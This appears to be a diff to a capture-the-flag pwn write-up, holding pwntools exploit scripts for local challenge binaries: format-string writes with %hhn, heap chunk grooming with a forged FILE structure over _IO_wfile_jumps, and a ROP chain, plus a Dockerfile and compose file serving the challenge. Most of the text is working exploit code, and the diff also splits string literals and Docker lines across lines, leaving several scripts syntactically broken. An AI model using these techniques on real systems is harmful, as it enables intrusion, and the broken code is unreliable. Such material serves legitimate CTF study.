@@ -17,7 +17,7 @@ io.sendlineafter(b"name length> ", tob(-0x98))
 
 payload = flat({
  0: b"xxx>%6$p->%19$p->%21$p-",
- 0x80-2: b"a" 
+ 0x80-2: b"a"
 })
 io.sendlineafter(b"name> ", payload)
 
@@ -59,7 +59,7 @@ for i in range(6):
  target = stack_target + i
  payload = f"%{target % 0x100}c%23$hhn".encode()
  io.sendlineafter(b"content> ", payload)
- 
+
  payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
  io.sendlineafter(b"content> ", payload)
 
@@ -72,7 +72,7 @@ for i in range(6):
  target = stack_target + i
  payload = f"%{target % 0x100}c%23$hhn".encode()
  io.sendlineafter(b"content> ", payload)
- 
+
  payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
  io.sendlineafter(b"content> ", payload)
 
@@ -85,7 +85,7 @@ for i in range(6):
  target = stack_target + i
  payload = f"%{target % 0x100}c%23$hhn".encode()
  io.sendlineafter(b"content> ", payload)
- 
+
  payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
  io.sendlineafter(b"content> ", payload)
 
@@ -98,7 +98,7 @@ for i in range(6):
  target = stack_target + i
  payload = f"%{target % 0x100}c%23$hhn".encode()
  io.sendlineafter(b"content> ", payload)
- 
+
  payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
  io.sendlineafter(b"content> ", payload)
 
@@ -111,18 +111,8 @@ pause(1)
 io.sendline(b"cat flag")
 
 io.interactive()
-```
-
-
-
-```
 | ---------- fake chunk -------------------|
 ...-| --- chunk1 --- | --- chunk2 --- | -...
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = 'info'
@@ -133,15 +123,24 @@ io = remote("127.0.0.1", 9999)
 tob = lambda x: str(x).encode()
 
 def add(size, content):
- io.sendlineafter(b"(1:add,2:release,3:print)> ", b"1")
+ io.sendlineafter(b"(1:
+add,2:
+release,3:
+print)> ", b"1")
  io.sendlineafter(b"size> ", tob(size))
  io.sendafter(b"note> ", content)
 
 def free():
- io.sendlineafter(b"(1:add,2:release,3:print)> ", b"2")
+ io.sendlineafter(b"(1:
+add,2:
+release,3:
+print)> ", b"2")
 
 def show():
- io.sendlineafter(b"(1:add,2:release,3:print)> ", b"3")
+ io.sendlineafter(b"(1:
+add,2:
+release,3:
+print)> ", b"3")
 
 log.success("exp running ...")
 add(0x70, b"aaa")
@@ -154,7 +153,7 @@ free()
 add(0x50, b"aaa")
 free()
 
-for i in range(0xa0-0x10, 0xf0, 0x10): 
+for i in range(0xa0-0x10, 0xf0, 0x10):
  add(i, b"aaa")
  free()
 
@@ -229,27 +228,17 @@ add(0xe0, flat({
  0xa0: fake_file_addr-0x10, # wide data
  0x88: fake_file_addr+0x100, # 可写，且内存为0即可
  0xD0: fake_file_addr+0x28-0x68, # wide data vtable
- 0xD8: libc.symbols['_IO_wfile_jumps'], # vtable 
+ 0xD8: libc.symbols['_IO_wfile_jumps'], # vtable
 }, filler=b"\x00"))
 
 add(0x20, p64(fake_file_addr))
 
 io.interactive()
-```
-
-
-
-```
 [
  pop_rbp, 4 + addr,
  pop_rdi, 0xde,
  0x0004006BB, rbp,
 ]
-```
-
-
-
-```
 def make_bytes(addr, bbb):
  target = []
  for i in range(len(bbb)):
@@ -263,11 +252,6 @@ def make_bytes(addr, bbb):
  ]
  target.extend(template)
  return target
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = 'debug'
@@ -304,7 +288,7 @@ io = process("./shutup")
 
 mov_rax_libc = 0x0000400696
 pop_rdi = 0x00000000004007e3
-get_rax = 0x004006B7 
+get_rax = 0x004006B7
 call_rax = 0x000000000040064e
 call_ptr_rax = 0x00000000004008a3
 pop_r14_r15 = 0x004007E0
@@ -320,7 +304,7 @@ offset = 0x10 # offset 2 syscall
 base = 0x00601380
 io.sendline(flat({
  0: base + 0x38, # rbp
- 0x8: pop_rdi, 
+ 0x8: pop_rdi,
  0x10: base + 0x30,
  0x18: 0x00400703, # call atoi
  0x20: pop_r14_r15,
@@ -382,12 +366,8 @@ io.sendline(flat({
 io.shutdown("send")
 
 io.interactive()
-```
-
-
-
-```
-FROM ubuntu:22.04@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6
+FROM ubuntu:22.04@sha256:
+b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6
 
 RUN apt update
 RUN apt install socat -yyq
@@ -400,18 +380,15 @@ RUN chmod +x /app/your_elf && chmod -w /app/your_elf && chmod -w /app/flag
 
 USER ctf
 
-CMD ["socat", "TCP-LISTEN:9999,reuseaddr,fork", "EXEC:/app/your_elf"]
-```
-
-
-
-```
+CMD ["socat", "TCP-LISTEN:
+9999,reuseaddr,fork", "EXEC:/app/your_elf"]
 version: '3'
 services:
  pwn-dev:
  build: .
  ports:
- - "9999:9999"
+ - "9999:
+9999"
  privileged: true
  restart: unless-stopped
 ```
